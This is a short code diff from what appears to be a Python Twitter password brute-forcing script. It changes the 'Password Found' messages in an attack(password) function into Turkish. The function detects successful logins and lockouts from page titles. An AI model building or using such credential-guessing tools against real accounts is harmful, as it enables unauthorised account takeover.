@@ -51,8 +51,8 @@ def attack(password):
       print ("\n Kilitlendi, Cikildi.!\n")
       sys.exit(1)
     elif br.title() == "Twitter":
-      print ("\n Password Found!\n")
-      print (" Password: %s\n" % (password))
+      print ("\n Parola Bulundu!\n")
+      print (" Parola: %s\n" % (password))
       sys.exit(1)  
     elif br.title() == "Verify your identity":
       print ("\n Password Found!\n")
